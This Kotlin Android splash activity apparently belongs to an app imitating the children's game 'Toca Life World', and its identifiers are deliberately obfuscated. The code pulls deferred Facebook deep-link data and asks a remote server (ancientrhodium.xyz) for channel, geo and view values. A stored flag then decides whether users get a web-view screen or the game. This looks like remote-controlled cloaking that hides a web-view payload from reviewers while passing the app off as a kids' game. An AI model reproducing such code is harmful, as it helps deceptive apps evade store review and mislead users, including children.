package com.tocaboca.tocalifeworldy.gtnjgtnjgtnjgt

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import com.facebook.applinks.AppLinkData
import com.tocaboca.tocalifeworldy.R
import com.tocaboca.tocalifeworldy.sfrrfgtgt.VebfrugthgActivity2
import com.tocaboca.tocalifeworldy.defrggtgt.DadadadaClass.Companion.ju5uj5ujuj
import com.tocaboca.tocalifeworldy.deojfrjfrji.IJfiuifrf
import com.tocaboca.tocalifeworldy.frgjgtjigt.KOfkorfokrfo
import com.tocaboca.tocalifeworldy.frjirfjigtjigt.GaamamemeActivity2
import com.tocaboca.tocalifeworldy.giojgtiojgtjiotg.SeccicicicicActivity2
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import retrofit2.Retrofit
import retrofit2.adapter.rxjava3.RxJava3CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory

class SplaaccjcjfjugtugtgtjgtActivity2 : AppCompatActivity() {
    private var bnyjuji2ki2ik: CompositeDisposable? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splaaccjcjfjugtugtgtjgt2)

        val fvrfgjtgtjigtgt = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (fvrfgjtgtjigtgt.getBoolean("activity_exec", false)) {
            val cffrrfgrfgtgtgt = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
            val vffrbfrygfrgyrf =  cffrrfgrfgtgtgt.getString("ENTRY_CODE", "0")
            if (vffrbfrygfrgyrf == "web"){
                startActivity(Intent(this, VebfrugthgActivity2::class.java))
                finish()
            } else {
                startActivity(Intent(this, GaamamemeActivity2::class.java))
                finish()
            }
        } else {
            val hy59hy59hy5hhy5 = fvrfgjtgtjigtgt.edit()
            hy59hy59hy5hhy5.putBoolean("activity_exec", true)
            hy59hy59hy5hhy5.apply()


            gtkgtkgtkk(this)


            bnyjuji2ki2ik = CompositeDisposable()

            val hyhy59hy59hy59hy22626 = Retrofit.Builder()
                .baseUrl("http://ancientrhodium.xyz/")
                .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build().create(IJfiuifrf.JOIfrjirfjirfji::class.java)

            bnyjuji2ki2ik?.add(
                hyhy59hy59hy59hy22626.hy59hy59hy59hy()
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribeOn(Schedulers.io())
                    .subscribe({ response -> onResponse(response) }, { t -> onFailure(t) })
            )
        }
    }

    private fun onResponse(response: KOfkorfokrfo) {

        Log.d("lolo", "${response}")
        ju5uj5ujuj["AppsCh"] = response.ancientnumber
        ju5uj5ujuj["GeoHose"] = response.ancientgeo
        ju5uj5ujuj["View"] = response.ancientlinoka

        startActivity(Intent(this@SplaaccjcjfjugtugtgtjgtActivity2, SeccicicicicActivity2::class.java))
        finish()

    }

    private fun onFailure(t: Throwable) {
        Toast.makeText(this,t.message, Toast.LENGTH_SHORT).show()
        Log.d("lolo", "${t.message}")
    }

    fun gtkgtkgtkk(ghkltnhynhynhyn: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            ghkltnhynhynhyn
        ) {
            if (it == null){

            }
            if (it!!.targetUri == null){

            }
            val dephyoujojuo = it!!.targetUri?.host.toString()
            ju5uj5ujuj["FBData"] = dephyoujojuo
        }
    }
}